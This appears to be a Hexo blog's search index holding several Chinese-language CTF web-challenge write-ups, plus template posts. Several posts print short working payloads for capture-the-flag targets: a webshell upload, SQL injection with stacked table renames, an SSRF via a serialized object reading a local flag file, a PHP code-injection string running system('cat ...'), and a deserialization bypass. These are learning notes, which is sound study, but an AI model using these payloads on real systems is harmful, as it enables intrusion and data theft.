class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先看这一段代码</p><blockquote><p>if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’)<br> 要越过这一条<br> 构造upload<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1-9&amp;submit&amp;page&#x3D;flag.php</span><br></pre></td></tr></table></figure></p></blockquote><p> <img src="https://i.loli.net/2021/01/14/ZQrdNGIWvi7j1E8.png" alt="显示越过成功"></p><p>下面继续看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">      <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">          <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">          fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">          fclose(<span class="variable">$f</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个正则的绕过有点没看懂<br>看来大佬的wp，好像就用.直接绕过了</p><p><img src="https://i.loli.net/2021/01/14/muTg1OFPhtHUjDz.png" alt="写一句话木马"><br>直接上传🐎</p><p><img src="https://i.loli.net/2021/01/14/Jacej8MzhYLBiq4.png" alt="蚁剑大法好啊"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-4th-WHCTF-2017</title>
      <link href="2021/01/09/XCTF-4th-WHCTF-2017/"/>
      <url>2021/01/09/XCTF-4th-WHCTF-2017/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-4th-WHCTF-2017-web题-CAT"><a href="#XCTF-4th-WHCTF-2017-web题-CAT" class="headerlink" title="XCTF 4th-WHCTF-2017 web题 CAT"></a>XCTF 4th-WHCTF-2017 web题 CAT</h1><p>首先打开题目，要求输入域名<br>首先随便输入了一个baidu.com<br>发现没有回显<br>然后在输入127.0.0.1</p><p><img src="https://i.loli.net/2021/01/03/mFVPchU8IuXagSi.png" alt="试一下本地的"><br>发现原来是ping的连接</p><p><img src="https://i.loli.net/2021/01/03/8MCw1AQPGJcO9Ys.png" alt="网上查询资料"></p><p>然后去看setting<br><img src="https://i.loli.net/2021/01/03/rwXI5klsEpH83j2.png"></p><p>找到路径之后，直接跳转<br><img src="https://i.loli.net/2021/01/03/4671fEYIvJDp3iB.png"><br>在这个里面去找database</p><p><img src="https://i.loli.net/2021/01/03/T2NpH1w9mUMoCtP.png" alt="找到database"><br>然后再去下一步，<br>去找ctf<br><img src="https://i.loli.net/2021/01/03/W4SlwVTqYDbH7JF.png" alt="查找ctf"></p><blockquote><p>得到flag！</p></blockquote><h2 id="关于php-curl的介绍"><a href="#关于php-curl的介绍" class="headerlink" title="关于php curl的介绍"></a>关于php curl的介绍</h2><p><img src="https://img.it610.com/image/info8/a24d1740e7224686a77188fbacf2139f.jpg"><br>感觉这题涉及到的知识有点太多了，几乎没接触过，看完别人的wp还是有点懵</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018</title>
      <link href="2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/"/>
      <url>2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2018-web题-fakebook"><a href="#网鼎杯-2018-web题-fakebook" class="headerlink" title="网鼎杯 2018 web题 fakebook"></a>网鼎杯 2018 web题 fakebook</h1><p><img src="https://i.loli.net/2021/01/03/fsdrYZWDb4NTeuh.png" alt="首先看题目"><br>随便注册一个账号</p><p><img src="https://i.loli.net/2021/01/03/d1c3VwsQrhOKzqD.png" alt="查看源码"><br>感觉是sql注入</p><p><img src="https://i.loli.net/2021/01/03/Jo8WurMy7GUSp1x.png" alt="加个&#39;试一下报错"><br>确实是sql注入</p><p><img src="https://i.loli.net/2021/01/03/b2S7483tiPqoFhC.png" alt="用orderby看一下列数"><br>有4列</p><p><img src="https://i.loli.net/2021/01/03/ru9xsfOEVIn2D6G.png" alt="试一下select"></p><p>发现好像没有成功，是不是把空格过滤了，换成++再试一下<br><img src="https://i.loli.net/2021/01/03/gMFxDB6suSVebom.png" alt="换成++成功了"></p><p>开始sql注入的基本步骤<br><img src="https://i.loli.net/2021/01/03/w5oUpLNPJGWxtXA.png"></p><p>去看一下data<br><img src="https://i.loli.net/2021/01/03/ElnyCGoxRvH29bi.png"></p><p>最后得到的结果好像有点不一样<br><img src="https://i.loli.net/2021/01/03/JbLWSENzjCBl39H.png"></p><p>查看robots.txt<br><img src="https://i.loli.net/2021/01/03/36vmxMgDeU1GKCI.png"></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完有点懵逼，查询资料才知道是考ssrf漏洞</p><p>利用SSRF漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=<span class="number">0</span>++union++select++<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/03/e6XaByfSor4wAG1.png"></p><p>去看源码<br><img src="https://i.loli.net/2021/01/03/glVrRB6OeLi4jTf.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>csaw-ctf-2016-quals</title>
      <link href="2021/01/07/csaw-ctf-2016-quals/"/>
      <url>2021/01/07/csaw-ctf-2016-quals/</url>
      
        <content type="html"><![CDATA[<h1 id="csaw-ctf-2016-quals-web题mfw"><a href="#csaw-ctf-2016-quals-web题mfw" class="headerlink" title="csaw-ctf-2016-quals web题mfw"></a>csaw-ctf-2016-quals web题mfw</h1><p>首先按打开题目<br><img src="https://i.loli.net/2021/01/03/LCsQtNgocb35GfD.png" alt="没有任何提示"></p><p>浏览不同的板块，发现就是url上面加上了？page=</p><p>接下来查看源码<br><img src="https://i.loli.net/2021/01/03/2QKuhIzxnETeqJw.png" alt="感觉有一点点提示"></p><p>在这个about板块里面，有GIT<br><img src="https://i.loli.net/2021/01/03/dN6Xm7YLF3zPq4t.png"><br>怀疑是git泄露，在url后面加上/.git/</p><p><img src="https://i.loli.net/2021/01/03/UnDOpslqIaNtYob.png" alt="打开/.git/"><br>还真的有东西</p><p>查询资料，需要用到GitHack<br><img src="https://i.loli.net/2021/01/03/MIjYLl7bJreXRT2.png" alt="下好并使用"></p><p>先查看flag.php</p><blockquote><p>好像啥也没有</p></blockquote><p>再分别看其他的php</p><p><img src="https://i.loli.net/2021/01/03/mdrcNfqRxXJL5Bi.png" alt="index.php"><br>好像只有index.php里面的东西有点作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=abc<span class="string">&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span></span><br></pre></td></tr></table></figure><p>于是想到这样构造payload<br><img src="https://i.loli.net/2021/01/03/w1YLuBixtFyUZof.png" alt="查看源码"></p><blockquote><p>得到flag！</p></blockquote><h2 id="学到的新知识"><a href="#学到的新知识" class="headerlink" title="学到的新知识"></a>学到的新知识</h2><p>关于源码泄露<br>1.svn 源码泄露<br>SVN（subversion）是源代码版本管理软件。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。<br>例：<a href="http://127.0.0.1/.svn/entries">http://127.0.0.1/.svn/entries</a><br>工具：Seay-Svn</p><p>2.git 源码泄露<br>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>例：<a href="http://127.0.0.1/.git/config">http://127.0.0.1/.git/config</a><br>工具：GitHack</p><ol start="3"><li>网站源码压缩备份泄露<br>一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWesterns</title>
      <link href="2020/12/27/TokyoWesterns/"/>
      <url>2020/12/27/TokyoWesterns/</url>
      
        <content type="html"><![CDATA[<h1 id="TokyoWesterns-CTF-shrine"><a href="#TokyoWesterns-CTF-shrine" class="headerlink" title="TokyoWesterns CTF shrine"></a>TokyoWesterns CTF shrine</h1><p>打开题目<br><img src="https://i.loli.net/2020/12/27/XZndtk7svaf8z2u.png" alt="全是源码"></p><p>审视源码<br><img src="https://i.loli.net/2020/12/27/W3y5xGApeC28KMI.png" alt="这么看舒服一点"><br>主要源码是python写的，得慢慢看</p><blockquote><p>知识点<br><img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200128200324741-208140586.png" alt="SSTI模板注入"></p></blockquote><blockquote><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它</p></blockquote><p><img src="https://i.loli.net/2020/12/27/fNUTPxBsiGEVLp4.png" alt="构造payload"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>护网杯2018</title>
      <link href="2020/12/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018/"/>
      <url>2020/12/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018/</url>
      
        <content type="html"><![CDATA[<h1 id="护网杯2018web题"><a href="#护网杯2018web题" class="headerlink" title="护网杯2018web题"></a>护网杯2018web题</h1><p>首先打开题目<br><img src="https://i.loli.net/2020/12/27/XxyuO5DPhq1t7ze.png" alt="把每个都看一遍"></p><p><img src="https://i.loli.net/2020/12/27/P34zmihWqOx98Hr.png" alt="/flag.txt"></p><p><img src="https://i.loli.net/2020/12/27/MpgKE92qIek7wR4.png" alt="/hints.txt"></p><p><img src="https://i.loli.net/2020/12/27/3kbDHi6c5Ka9Oj2.png" alt="/welcome.txt"></p><p>百度了一下render</p><blockquote><p>render直接渲染视图， 即直接将页面render部分渲染成partial参数后面名字相同的_名字.html.erb文件</p></blockquote><p>根据hint.txt知道，是md5加密，现在就是要去找cookie_secret<br>直接搜索，发现在tornado文档有关于cookie_secret，</p><p><img src="https://i.loli.net/2020/12/27/JfVBW3TgQhXP5Ie.png" alt="找到cookie_secret"></p><p>写个php脚本，运行一下，让他计算出md5<br><img src="https://i.loli.net/2020/12/27/TKMYXjuQRLxVSw2.png" alt="在线运行"></p><p>最后用回到题目运行<br><img src="https://i.loli.net/2020/12/27/rZg4AXFVxQbtJz3.png" alt="QQ截图20201227095310.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xtctf</title>
      <link href="2020/12/24/xtctf/"/>
      <url>2020/12/24/xtctf/</url>
      
        <content type="html"><![CDATA[<p>#XTCTF</p><p>打开题目<br><img src="https://i.loli.net/2020/12/24/gydsZaqw1fKeR53.png" alt="审视代码"></p><p>构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。<br>在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>经过base64加密得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/24/nKcx3paDzkrGFUf.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF 4th-CyberEarth</title>
      <link href="2020/12/19/XCTF%204th-CyberEarth/"/>
      <url>2020/12/19/XCTF%204th-CyberEarth/</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-4th-CyberEarth"><a href="#XCTF-4th-CyberEarth" class="headerlink" title="XCTF 4th-CyberEarth"></a>XCTF 4th-CyberEarth</h1><p>题目提示：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p><p>直奔主题:报表中心<br><img src="https://i.loli.net/2020/12/19/w4Qo5XdAKLjCynN.png"><br>多次尝试改id的值，发现都会回到1;<br>根据题目的提示，知道应该只有一个值是正确的，是入侵者留下的;</p><p><img src="https://i.loli.net/2020/12/19/DGfYPt8hv96CBZA.png" alt="用网络代理"></p><p>准备暴力破解<br><img src="https://i.loli.net/2020/12/19/4DU2uFl6mONcH78.png"></p><p>用burp，选择number数字破解，从1到5000，一个一个爆破<br><img src="https://i.loli.net/2020/12/19/fCxEoky6AacBGvq.png" alt="暴力破解"></p><p><img src="https://i.loli.net/2020/12/19/agGSO8XwehfH3b6.png"></p><blockquote><p>得到falg！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯 2019 web题</title>
      <link href="2020/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20web%E9%A2%98/"/>
      <url>2020/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2019-web题"><a href="#强网杯-2019-web题" class="headerlink" title="强网杯 2019 web题"></a>强网杯 2019 web题</h1><p>打开题目<br> <img src="https://i.loli.net/2020/12/18/1dUy56YohcNZEDS.png"></p><p>发现是sql注入<br> <img src="https://i.loli.net/2020/12/18/OnaQGP2D9H5Vfke.png" alt="判断是否会报错"></p><p><img src="https://i.loli.net/2020/12/18/4AzSvDTwk3l1OiR.png" alt="将后面的过滤掉"></p><p>尝试用order by和union select进行查看<br><img src="https://i.loli.net/2020/12/18/7NmKCpGRUTBqf6a.png" alt="select的语句被过滤掉了"></p><p>查询资料，尝试用堆叠注入<br> <img src="https://i.loli.net/2020/12/18/yslA5bqpBguLtnh.png" alt="尝试查看tables成功"></p><p>其中有两个columns，分别查看<br> <img src="https://i.loli.net/2020/12/18/ulCHsR8ngG2UOa1.png" alt="查看words columns"></p><p><img src="https://i.loli.net/2020/12/18/uwnx39QptRhO6JZ.png" alt="查看另外一个"><br>  发现flag，但是直接show flag会失败，查询资料后知道，返回的都是words columns</p><p> 于是进行骚操作</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`words1`</span>;<span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>; <span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);%23</span><br></pre></td></tr></table></figure><p>最后一步 1’ or 1=1%23<br> <img src="https://i.loli.net/2020/12/18/KmkMOypidQGBU67.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web高手区003</title>
      <link href="2020/12/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E5%8C%BA003/"/>
      <url>2020/12/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E5%8C%BA003/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界web高手区003"><a href="#攻防世界web高手区003" class="headerlink" title="攻防世界web高手区003"></a>攻防世界web高手区003</h1><p> 首先打开题目<br><img src="https://i.loli.net/2020/12/17/pGbzECfmToRcXnF.png"></p><p> 看/index.php   没反应<br> 看/index.phps  发现源码泄露</p><p><img src="https://i.loli.net/2020/12/17/tkSm3W62geOZQDL.png"></p><p> 审视代码，发现是URL编码与解码，且id=’admin’<br> 用burp进行编码</p><p><img src="https://i.loli.net/2020/12/17/IJH4GWS2BdnCPqa.png"></p><p> 发现浏览器会自动解码</p><p><img src="https://i.loli.net/2020/12/17/6nNwkRtKq5JzdY1.png"></p><p> 用burp编码两次</p><p><img src="https://i.loli.net/2020/12/17/CgcTM8UhqilJ5EB.png"></p><p> 再次尝试</p><p><img src="https://i.loli.net/2020/12/17/9lJMkOna1XoiuLv.png"></p><blockquote><p>获得flag！</p></blockquote><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The first try</title>
      <link href="2020/12/17/The%20first%20try/"/>
      <url>2020/12/17/The%20first%20try/</url>
      
        <content type="html"><![CDATA[<h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><blockquote><p>引用</p></blockquote><hr><p><em>斜体</em><br><strong>加粗</strong></p><p>！<a href="%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5">说明</a></p><p><a href="http://baidu.com/">百度</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="string">&quot;代码块&quot;</span></span><br></pre></td></tr></table></figure><ul><li>列表</li><li>列表</li></ul><ol><li>列表</li><li>列表</li></ol><table><thead><tr><th align="center">表头</th><th align="left">表头</th><th align="right">表头</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">2</td><td align="right">3</td></tr></tbody></table><p><del>删除</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/16/hello-world/"/>
      <url>2020/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
